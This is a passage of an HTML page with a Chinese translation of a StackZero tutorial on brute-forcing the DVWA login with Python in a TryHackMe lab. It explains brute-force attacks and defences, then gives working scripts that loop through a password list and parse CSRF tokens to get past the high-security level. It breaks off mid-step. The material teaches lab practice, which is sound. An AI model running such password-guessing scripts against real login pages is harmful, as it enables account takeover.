<html>
<head>
<title>How to Brute Force DVWA login with Python — StackZero</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">如何用Python暴力破解DVWA登录— StackZero</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/guess-your-enemies-passwords-with-python-brute-force-attack-99352e65ec8a?source=collection_archive---------3-----------------------#2022-11-03">https://infosecwriteups.com/guess-your-enemies-passwords-with-python-brute-force-attack-99352e65ec8a?source=collection_archive---------3-----------------------#2022-11-03</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><figure class="gl gn jr js jt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi jq"><img src="../Images/f2b4d90bb8f7199bc6f533b42e91bb8f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*kRgd4WeIMn0u_7Zw.jpg"/></div></div></figure><blockquote class="kb kc kd"><p id="3f6c" class="ke kf kg kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">本文最初发表于<a class="ae ld" href="https://www.stackzero.net/brute-force-dvwa-python/" rel="noopener ugc nofollow" target="_blank">https://www.stackzero.net/brute-force-dvwa-python/</a></p></blockquote><p id="57f3" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">嘿黑客们！在本文中，我想向您展示网络安全领域最知名的攻击之一。正如我们通常所做的那样，我们将在实践中这样做。<br/>本教程的目标是实现一个简单的python脚本，对<a class="ae ld" href="https://github.com/digininja/DVWA" rel="noopener ugc nofollow" target="_blank"> DVWA </a>进行暴力攻击！</p><p id="12ab" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">这一次不是一个真正的弱点，就像:</p><ul class=""><li id="a2bc" class="lh li it kh b ki kj km kn le lj lf lk lg ll lc lm ln lo lp bi translated"><a class="ae ld" href="https://medium.com/codex/sql-injection-what-you-need-to-know-stackzero-abc80bc1ea5e" rel="noopener"> SQL注入</a></li><li id="b179" class="lh li it kh b ki lq km lr le ls lf lt lg lu lc lm ln lo lp bi translated"><a class="ae ld" href="https://medium.com/codex/the-terrifying-world-of-cross-site-scripting-xss-part-1-stackzero-54be9cdc011a" rel="noopener"> XSS </a></li><li id="a606" class="lh li it kh b ki lq km lr le ls lf lt lg lu lc lm ln lo lp bi translated"><a class="ae ld" rel="noopener ugc nofollow" target="_blank" href="/what-is-command-injection-and-how-to-exploit-it-stackzero-ac7643bc492">命令喷射</a></li></ul><p id="a55a" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">但是在我们动手之前，我想我们需要一个简短的解释。</p><h1 id="aa51" class="lv lw it bd lx ly lz ma mb mc md me mf mg mh mi mj mk ml mm mn mo mp mq mr ms bi translated">什么是暴力攻击？</h1><p id="e6bb" class="pw-post-body-paragraph ke kf it kh b ki mt kk kl km mu ko kp le mv ks kt lf mw kw kx lg mx la lb lc im bi translated">一个非常解释性的定义可能是:</p><p id="36db" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated"><em class="kg">暴力攻击是一种网络攻击，黑客使用自动化工具猜测用户或系统的密码。</em> <br/>黑客通常在事先不知道密码或系统的情况下实施这种攻击，并试图获得系统或帐户的访问权限。</p><p id="1e05" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">暴力攻击可能是一个非常耗时和繁琐的过程，特别是如果密码很长、很复杂并且通常很容易被发现，因此它代表了现实世界攻击中的最后手段(对于谨慎的用户)。然而，在强大的计算机和正确的软件的帮助下，黑客每秒钟可以做出数千次猜测。</p><p id="b607" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">暴力攻击有两种类型:</p><ol class=""><li id="62f4" class="lh li it kh b ki kj km kn le lj lf lk lg ll lc my ln lo lp bi translated"><strong class="kh iu">测试允许字符的所有可能组合(很少使用，相对较长的密码很难成功使用)</strong></li><li id="8390" class="lh li it kh b ki lq km lr le ls lf lt lg lu lc my ln lo lp bi translated"><strong class="kh iu">从列表中测试密码(它适用于弱密码)。</strong></li></ol><h1 id="603d" class="lv lw it bd lx ly lz ma mb mc md me mf mg mh mi mj mk ml mm mn mo mp mq mr ms bi translated">暴力的最佳工具</h1><p id="38f4" class="pw-post-body-paragraph ke kf it kh b ki mt kk kl km mu ko kp le mv ks kt lf mw kw kx lg mx la lb lc im bi translated">在这一点上，你应该知道我们解决问题的方法，由于我们愿意学习，仅仅使用一个工具而没有深厚的知识是不可取的。<br/>然而，在现实世界中，它们可以节省我们很多时间，所以在编写我们的python脚本和在我们的DVWA机器上执行暴力攻击之前，我只想用简短的描述列出最好的工具。<br/>(我将把列表限制为针对Web应用程序暴力攻击的工具)</p><ul class=""><li id="375d" class="lh li it kh b ki kj km kn le lj lf lk lg ll lc lm ln lo lp bi translated">Callow :这是一个非常容易使用的Python脚本，允许你从命令行发起攻击，通过插入选择器作为输入。如果你想测试它，你可以在这里找到详细的指南<a class="ae ld" href="https://medium.com/@maximousblk/callow-6d42a14dbd50" rel="noopener"/>。</li><li id="089f" class="lh li it kh b ki lq km lr le ls lf lt lg lu lc lm ln lo lp bi translated"><a class="ae ld" href="https://portswigger.net/burp" rel="noopener ugc nofollow" target="_blank"> BurpSuite </a>:它被广泛用于渗透测试，它有很多特性，其中之一(入侵者)允许我们发起暴力攻击。</li><li id="21de" class="lh li it kh b ki lq km lr le ls lf lt lg lu lc lm ln lo lp bi translated">Hydra :最快最全的蛮力工具，也有GUI。它的知识对于渗透测试仪来说是必不可少的。</li></ul><h1 id="0ccb" class="lv lw it bd lx ly lz ma mb mc md me mf mg mh mi mj mk ml mm mn mo mp mq mr ms bi translated">如何保护自己</h1><p id="d577" class="pw-post-body-paragraph ke kf it kh b ki mt kk kl km mu ko kp le mv ks kt lf mw kw kx lg mx la lb lc im bi translated">在这种情况下，系统中没有真正的漏洞，因此最好的保护方法是使所需的试验数量大到无法在合理的时间内完成，并可能阻止可疑的活动。</p><p id="a3f3" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">有许多方法可以防止暴力攻击，但以下是一些最有效的方法:</p><ol class=""><li id="dfa5" class="lh li it kh b ki kj km kn le lj lf lk lg ll lc my ln lo lp bi translated">使用强密码，并且永远不要重复使用。</li><li id="28b1" class="lh li it kh b ki lq km lr le ls lf lt lg lu lc my ln lo lp bi translated">使用密码管理器来生成和存储强密码。</li><li id="daca" class="lh li it kh b ki lq km lr le ls lf lt lg lu lc my ln lo lp bi translated">尽可能启用双因素身份验证。</li><li id="c57e" class="lh li it kh b ki lq km lr le ls lf lt lg lu lc my ln lo lp bi translated">作为网站管理员，您可以通过在两次试验之间引入延迟来干扰攻击</li></ol><p id="2fc7" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">所有这些措施都会使攻击变得非常复杂，以至于可能需要几千年(或更长时间，取决于密码的复杂性)来测试所有可能的组合，从而使系统几乎不会受到这种攻击。</p><h1 id="cdb8" class="lv lw it bd lx ly lz ma mb mc md me mf mg mh mi mj mk ml mm mn mo mp mq mr ms bi translated">步骤#0:准备环境</h1><p id="daa4" class="pw-post-body-paragraph ke kf it kh b ki mt kk kl km mu ko kp le mv ks kt lf mw kw kx lg mx la lb lc im bi translated">在开始用python编写暴力攻击代码之前，我们需要准备好<a class="ae ld" href="https://github.com/digininja/DVWA" rel="noopener ugc nofollow" target="_blank"> DVWA </a>机器，并导入我们需要的所有库。</p><p id="b461" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">和目标机没那么多关系，因为我要用的是<a class="ae ld" href="https://tryhackme.com/room/dvwa" rel="noopener ugc nofollow" target="_blank"> TryHackMe </a>提供的那个。<br/>这个精彩的网站还提供了如何配置VPN来访问机器的完整教程，所以我会理所当然地认为你在一台<a class="ae ld" href="https://www.stackzero.net/how-to-install-kali-linux-on-virtualbox-in-a-few-minutes/" rel="noopener ugc nofollow" target="_blank"> Kali机器</a>上，并且你可以访问一个<a class="ae ld" href="https://github.com/digininja/DVWA" rel="noopener ugc nofollow" target="_blank"> DVWA </a>的实例。</p><p id="864a" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">下一步是安装所需的库，在本例中:</p><ul class=""><li id="159d" class="lh li it kh b ki kj km kn le lj lf lk lg ll lc lm ln lo lp bi translated"><a class="ae ld" href="https://www.crummy.com/software/BeautifulSoup/" rel="noopener ugc nofollow" target="_blank"> BeautifulSoup </a>:负责解析HTML的库。</li><li id="f8e3" class="lh li it kh b ki lq km lr le ls lf lt lg lu lc lm ln lo lp bi translated"><a class="ae ld" href="https://requests.readthedocs.io/en/latest/" rel="noopener ugc nofollow" target="_blank">请求</a>:帮助发送HTTP请求的库。</li></ul><p id="09f0" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">我还分享了一个文件，它将为你提供一个类，使得用python登录<a class="ae ld" href="https://github.com/digininja/DVWA" rel="noopener ugc nofollow" target="_blank"> DVWA </a>更加容易。你可以在我的<a class="ae ld" href="https://github.com/StackZeroSec/dvwa/blob/main/utils.py" rel="noopener ugc nofollow" target="_blank"> GitHub库</a>中找到它，在暴力部分，也有本教程中的代码。如果你只是想复制粘贴，这是实用程序的代码。</p><pre class="mz na nb nc gt nd ne nf ng aw nh bi"><span id="d845" class="ni lw it ne b gy nj nk l nl nm">from bs4 import BeautifulSoup<br/>from enum import Enum<br/>import string</span><span id="ff8b" class="ni lw it ne b gy nn nk l nl nm">class SecurityLevel(Enum):<br/>    LOW = "low"<br/>    MEDIUM = "medium"<br/>    HIGH = "high"<br/>    IMPOSSIBLE = "impossible"<br/>class CSRFManager:</span><span id="f138" class="ni lw it ne b gy nn nk l nl nm"><a class="ae ld" href="http://twitter.com/staticmethod" rel="noopener ugc nofollow" target="_blank">@staticmethod</a><br/>    def set_csrf_token(func):<br/>        def wrapper(*args, **kwargs):<br/>            <br/>            <br/>            user_token = CSRFManager.get_token(args[0]._session, args[0].url)<br/>            <br/>            if user_token != None:<br/>                args[0].user_token = user_token["value"]<br/>                                         <br/>            return func(*args, **kwargs)<br/>        return wrapper<br/>    <br/>    <a class="ae ld" href="http://twitter.com/staticmethod" rel="noopener ugc nofollow" target="_blank">@staticmethod</a><br/>    def get_token(session:requests.Session, url:str):<br/>        <br/>        response = session.get(url)<br/>        soup = BeautifulSoup(response.text, 'html.parser')<br/>        user_token = soup.find("input", {"name": "user_token"})<br/>        return user_token</span><span id="ce34" class="ni lw it ne b gy nn nk l nl nm">class DVWASessionProxy:<br/>    login_data = {<br/>            "username": "admin",<br/>            "password": "password",<br/>            "Login": "Login"<br/>    }<br/>    def __init__(self, url):<br/>        super().__init__()<br/>        self._session = requests.Session()<br/>        self.url = f"{url}/login.php"<br/>        self.data = {}<br/>    <br/>    <a class="ae ld" href="http://twitter.com/property" rel="noopener ugc nofollow" target="_blank">@property</a><br/>    def security(self):<br/>        return self._session.cookies.get_dict()["security"]<br/>    <br/>    <a class="ae ld" href="http://twitter.com/security" rel="noopener ugc nofollow" target="_blank">@security</a>.setter<br/>    def security(self, security_level):</span><span id="0abf" class="ni lw it ne b gy nn nk l nl nm">self._session.cookies.pop("security")<br/>        self._session.cookies.set("security", security_level.value)<br/> <br/>    <a class="ae ld" href="http://twitter.com/property" rel="noopener ugc nofollow" target="_blank">@property</a><br/>    def user_token(self):<br/>        return self.data["user_token"]<br/>    <br/>    <a class="ae ld" href="http://twitter.com/user_token" rel="noopener ugc nofollow" target="_blank">@user_token</a>.setter<br/>    def user_token(self, value):<br/>        self.data["user_token"] = value</span><span id="e0ca" class="ni lw it ne b gy nn nk l nl nm">def __enter__(self):<br/>        <br/>        response = self.login(self.url, data= {**self.data, **DVWASessionProxy.login_data}) <br/>        return self<br/>    <br/>    def get(self, url ,headers=None, params=None, cookies=None):<br/>        response = self._session.get(url, headers=headers, params=params, cookies=cookies)<br/>        self.url = response.url<br/>        return response<br/>    <br/>    <a class="ae ld" href="http://twitter.com/CSRFManager" rel="noopener ugc nofollow" target="_blank">@CSRFManager</a>.set_csrf_token<br/>    def login(self, url, headers=None, data=None):</span><span id="21b3" class="ni lw it ne b gy nn nk l nl nm">response = self._session.post(url, headers=headers, data={**self.data, **data})</span><span id="c4ba" class="ni lw it ne b gy nn nk l nl nm">def post(self, url ,headers=None, data=None, cookies=None):</span><span id="1e57" class="ni lw it ne b gy nn nk l nl nm">response = self._session.post(url, headers=headers, data=data, cookies=cookies)</span><span id="fe98" class="ni lw it ne b gy nn nk l nl nm">return response</span><span id="d953" class="ni lw it ne b gy nn nk l nl nm">def __exit__(self, exc_type, exc_val, exc_tb):<br/>        self._session.close()</span><span id="db05" class="ni lw it ne b gy nn nk l nl nm">class DVWASQLiResponseParser:<br/>    def __init__(self, response):<br/>        self.response = response</span><span id="eaab" class="ni lw it ne b gy nn nk l nl nm">def get_interesting_value(self):<br/>        <br/>        soup = BeautifulSoup(self.response.content, 'html.parser')<br/>        interesting_value = soup.find("pre")<br/>        return interesting_value<br/>            <br/>    def check_presence(self, string):<br/>        return string in self.get_interesting_value().text</span></pre><h1 id="fa26" class="lv lw it bd lx ly lz ma mb mc md me mf mg mh mi mj mk ml mm mn mo mp mq mr ms bi translated">第0步:了解目标</h1><p id="002b" class="pw-post-body-paragraph ke kf it kh b ki mt kk kl km mu ko kp le mv ks kt lf mw kw kx lg mx la lb lc im bi translated">在继续之前，让我们使用凭证登录到<a class="ae ld" href="https://github.com/digininja/DVWA" rel="noopener ugc nofollow" target="_blank"> DVWA </a>:</p><ul class=""><li id="0643" class="lh li it kh b ki kj km kn le lj lf lk lg ll lc lm ln lo lp bi translated"><strong class="kh iu">用户名</strong>:管理员</li><li id="c7ae" class="lh li it kh b ki lq km lr le ls lf lt lg lu lc lm ln lo lp bi translated"><strong class="kh iu">密码</strong>:密码</li></ul><figure class="mz na nb nc gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi no"><img src="../Images/748e8ba525d6c86744455cc05abfc672.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*TnXQ___qDTx-KL2cgm-FqQ.jpeg"/></div></div></figure><p id="e134" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">之后，你必须从左边的设置中设置低难度:</p><figure class="mz na nb nc gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi no"><img src="../Images/d9a23f35ca82859bf9a6c87c8b00ff97.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*MI4Qcgaz8E1thfe3NZSfIA.jpeg"/></div></div></figure><p id="857b" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">现在我们已经准备好获取我们需要的信息，所以单击左侧栏中的蛮力菜单项，您应该会看到这个屏幕:</p><figure class="mz na nb nc gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi np"><img src="../Images/441c79bed19511e94dab122f9ad64362.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*WAFa5kdKyHW1Pmst1YjU1A.jpeg"/></div></div></figure><p id="7b71" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">现在让我们尝试插入一些随机数据(如用户名:admin，密码:admin)并查看结果:</p><figure class="mz na nb nc gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi nq"><img src="../Images/50a4b10d44ddec08d122d7beedb65b10.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*rg-Ooh2vh2oahPFjYefqwA.jpeg"/></div></div></figure><p id="1004" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">另一件重要的事情是查看类似于以下内容的URL:</p><p id="163f" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated"><code class="fe nr ns nt ne b"><a class="ae ld" href="http://10.10.199.147/vulnerabilities/brute/?username=admin&amp;password=admin&amp;Login=Login#" rel="noopener ugc nofollow" target="_blank">http://10.10.199.147/vulnerabilities/brute/?username=admin&amp;password=admin&amp;Login=Login#</a></code></p><p id="09d1" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">所以我们知道这个请求是一个get请求，它有三个参数:</p><ul class=""><li id="d551" class="lh li it kh b ki kj km kn le lj lf lk lg ll lc lm ln lo lp bi translated">用户名</li><li id="a8c7" class="lh li it kh b ki lq km lr le ls lf lt lg lu lc lm ln lo lp bi translated">密码</li><li id="c2dd" class="lh li it kh b ki lq km lr le ls lf lt lg lu lc lm ln lo lp bi translated">注册</li></ul><p id="5919" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">我们还知道，如果失败，我们需要在响应中查找这个字符串(或者可能是一部分):</p><p id="890a" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated"><code class="fe nr ns nt ne b">Username and/or password incorrect.</code></p><p id="084e" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">现在我们知道了我们需要的一切，我们可以开始编码了！</p><h1 id="edab" class="lv lw it bd lx ly lz ma mb mc md me mf mg mh mi mj mk ml mm mn mo mp mq mr ms bi translated">步骤1:在低安全性DVWA上使用暴力</h1><p id="d7a1" class="pw-post-body-paragraph ke kf it kh b ki mt kk kl km mu ko kp le mv ks kt lf mw kw kx lg mx la lb lc im bi translated">感谢我们所创造的，当我们尝试不同的安全级别时，没有太多的变化要做。<br/>在这一步中，我们可以解决没有任何保护的最简单的关卡，但我们不会急于求成，这样我们就可以专注于程序。<br/>在开始python脚本之前，让我们写下我们想要成功地对DVWA执行暴力攻击所要做的事情。</p><ul class=""><li id="18d5" class="lh li it kh b ki kj km kn le lj lf lk lg ll lc lm ln lo lp bi translated">定义发送凭据的函数</li><li id="3001" class="lh li it kh b ki lq km lr le ls lf lt lg lu lc lm ln lo lp bi translated">定义一个从文件中读取密码并返回列表的函数。</li><li id="8a2d" class="lh li it kh b ki lq km lr le ls lf lt lg lu lc lm ln lo lp bi translated">将它们放在一个main中，该main将使用for循环发送列表中的每个密码。</li></ul><p id="8dd5" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">对于密码列表，我将使用<a class="ae ld" href="https://github.com/danielmiessler/SecLists" rel="noopener ugc nofollow" target="_blank"> SecLists </a>中的<a class="ae ld" href="https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10-million-password-list-top-1000.txt" rel="noopener ugc nofollow" target="_blank">1000万密码列表top-1000.txt </a>。</p><p id="3c2d" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">让我们定义一个从文件中检索密码并返回列表的方法:</p><pre class="mz na nb nc gt nd ne nf ng aw nh bi"><span id="06f4" class="ni lw it ne b gy nj nk l nl nm">def get_passwords(filename):<br/>    q = []<br/>    with open(filename, 'r') as f:<br/>        for e in f.read().split("\n"):<br/>            q.append(e)</span><span id="c491" class="ni lw it ne b gy nn nk l nl nm">    return q</span></pre><p id="b736" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">现在我们需要定义发送凭证的方法。<br/>我选择在这个函数中一步一步地构建URL，通过在字典中传递参数，因为它将在最后一级帮助我们，所以让我们看看它是如何出现的:</p><pre class="mz na nb nc gt nd ne nf ng aw nh bi"><span id="58fa" class="ni lw it ne b gy nj nk l nl nm">def send_credentials(session, url, data):</span><span id="fa5c" class="ni lw it ne b gy nn nk l nl nm">    target_url = url<br/>    for k, v in data.items():<br/>        target_url+=f"{k}={v}&amp;"<br/>    target_url = target_url[:-1]+"#"<br/>    response = session.get(target_url)   <br/>    return response</span></pre><p id="f83c" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">最后，在main函数中，我们需要发送凭证，直到我们没有收到不包含单词<em class="kg">“不正确的密码”</em>的响应</p><p id="7f8d" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">我们将在for循环中这样做:</p><pre class="mz na nb nc gt nd ne nf ng aw nh bi"><span id="52ee" class="ni lw it ne b gy nj nk l nl nm">if __name__=="__main__":<br/>    BASE_URL = "<a class="ae ld" href="http://10.10.36.246" rel="noopener ugc nofollow" target="_blank">http://10.10.36.246</a>"<br/>    bruteforce_url = f"{BASE_URL}/vulnerabilities/brute?"<br/>    filename = sys.argv[1]<br/>    username = "admin"</span><span id="772b" class="ni lw it ne b gy nn nk l nl nm">    q = get_passwords(filename)</span><span id="eee1" class="ni lw it ne b gy nn nk l nl nm">    with DVWASessionProxy(BASE_URL) as s:<br/>        s.security = SecurityLevel.LOW<br/>        for password in q:<br/>                      <br/>            data = {<br/>            "username": username,<br/>            "password": password,<br/>            "Login": "Login"<br/>            }<br/>            response = send_credentials(s, bruteforce_url, data)<br/>            print(" "*40, end="\r")<br/>            print(f"[!] Testing: {password}", end="\r")<br/>            if "password incorrect." not in response.text:<br/>                print("")<br/>                print(f"[+] Found: {password}")<br/>                break</span></pre><p id="d6be" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">如您所见，我选择了将密码文件作为sys参数传递。</p><p id="8a13" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">只是为了让工作更有趣，我已经打乱了文件(如果你不想在几次尝试后得到匹配，你可以做同样的事情)。</p><p id="78e2" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">因此，让我们通过键入以下命令来运行脚本:</p><p id="2a63" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated"><code class="fe nr ns nt ne b">python main.py passwords.txt</code></p><p id="9352" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">这是我们用用户名<em class="kg">“admin”</em>尝试时的结果</p><figure class="mz na nb nc gt ju gh gi paragraph-image"><div class="gh gi nu"><img src="../Images/000c5d29dafb1d30ccfafbe34935f23b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1090/format:webp/1*PjDqdKJAIF9QWm-A4KSQ0g.jpeg"/></div></figure><p id="8bad" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">仅此而已，你看到的版画只是为了做一个好看的动画，与逻辑无关。</p><h1 id="90ee" class="lv lw it bd lx ly lz ma mb mc md me mf mg mh mi mj mk ml mm mn mo mp mq mr ms bi translated">步骤2:在中等安全的DVWA上使用暴力</h1><p id="5dac" class="pw-post-body-paragraph ke kf it kh b ki mt kk kl km mu ko kp le mv ks kt lf mw kw kx lg mx la lb lc im bi translated">该级别仅引入了2秒钟的延迟，但逻辑保持不变，我们需要做的唯一更改是在主函数中替换<a class="ae ld" href="https://github.com/digininja/DVWA" rel="noopener ugc nofollow" target="_blank"> DVWA </a>安全级别:</p><p id="2818" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated"><code class="fe nr ns nt ne b">s.security = SecurityLevel.LOW</code></p><p id="c42d" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">有了这个:</p><p id="227d" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated"><code class="fe nr ns nt ne b">s.security = SecurityLevel.MEDIUM</code></p><p id="9ab4" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">在那之后，我们的python脚本准备再次无障碍地执行暴力攻击。</p><p id="1c1b" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">因此，如果我们启动脚本，这又是结果(我们可以喝一杯咖啡，可能它需要的比前一级多得多)。</p><figure class="mz na nb nc gt ju gh gi paragraph-image"><div class="gh gi nu"><img src="../Images/000c5d29dafb1d30ccfafbe34935f23b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1090/format:webp/1*PjDqdKJAIF9QWm-A4KSQ0g.jpeg"/></div></figure><h1 id="19cf" class="lv lw it bd lx ly lz ma mb mc md me mf mg mh mi mj mk ml mm mn mo mp mq mr ms bi translated">步骤3:对高安全性DVWA的暴力攻击</h1><p id="2c92" class="pw-post-body-paragraph ke kf it kh b ki mt kk kl km mu ko kp le mv ks kt lf mw kw kx lg mx la lb lc im bi translated">我们终于到了最后一关，这里又出现了新的困难。</p><p id="5b9d" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">为了测试新的水平，尝试再次进入浏览器，在将难度设置为高之后，进入暴力破解部分，并尝试使用<strong class="kh iu">用户名=管理员</strong>和<strong class="kh iu">密码=管理员</strong>登录。</p><p id="2362" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">通过查看URL栏，您可以看到一个由32个字符组成的附加参数:user_token，如下所示:</p><p id="f545" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated"><code class="fe nr ns nt ne b"><a class="ae ld" href="http://10.10.36.246/vulnerabilities/brute/?username=admin&amp;password=admin&amp;Login=Login&amp;user_token=fcab4bb060c1fc2b4c6d57f4f70e3985#" rel="noopener ugc nofollow" target="_blank">http://10.10.36.246/vulnerabilities/brute/?username=admin&amp;password=admin&amp;Login=Login&amp;user_token=fcab4bb060c1fc2b4c6d57f4f70e3985#</a></code></p><p id="093f" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">这是一个<a class="ae ld" href="https://en.wikipedia.org/wiki/Cross-site_request_forgery" rel="noopener ugc nofollow" target="_blank"> CSRF </a>令牌，简而言之就是一个由服务器生成的隐藏输入，它必须与完整的请求一起被发送回去，以使其有效。</p><p id="eaf8" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">为了提出有效的请求，我们主要需要做的是:</p><ul class=""><li id="3d88" class="lh li it kh b ki kj km kn le lj lf lk lg ll lc lm ln lo lp bi translated">向页面发出GET请求</li><li id="815a" class="lh li it kh b ki lq km lr le ls lf lt lg lu lc lm ln lo lp bi translated">解析用户令牌</li><li id="4bf1" class="lh li it kh b ki lq km lr le ls lf lt lg lu lc lm ln lo lp bi translated">发送带有凭据的用户令牌</li></ul><p id="3c06" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">通过查看HTML代码(Firefox浏览器中的CTRL + U ),我们看到了与令牌相关的部分:</p><pre class="mz na nb nc gt nd ne nf ng aw nh bi"><span id="d63d" class="ni lw it ne b gy nj nk l nl nm">Username:&lt;br&gt;<br/>   &lt;input type="text" name="username"&gt;&lt;br&gt;<br/>   Password:&lt;br&gt;<br/>   &lt;input type="password" autocomplete="off" name="password"&gt;&lt;br&gt;<br/>   &lt;br&gt;<br/>   &lt;input type="submit" value="Login" name="Login"&gt;<br/>   &lt;input type="hidden" name="user_token" value="15ce2cbeebca3d0c456985d30d784f2f"&gt;</span></pre><p id="dfe1" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">所以我们可以用这几行代码得到它:</p><pre class="mz na nb nc gt nd ne nf ng aw nh bi"><span id="03ba" class="ni lw it ne b gy nj nk l nl nm">response = s.get(bruteforce_url)<br/>soup = BeautifulSoup(response.text, 'html.parser')<br/>user_token = soup.find("input", {"name": "user_token"})["value"]<br/>data["user_token"] = user_token</span></pre><p id="799e" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi 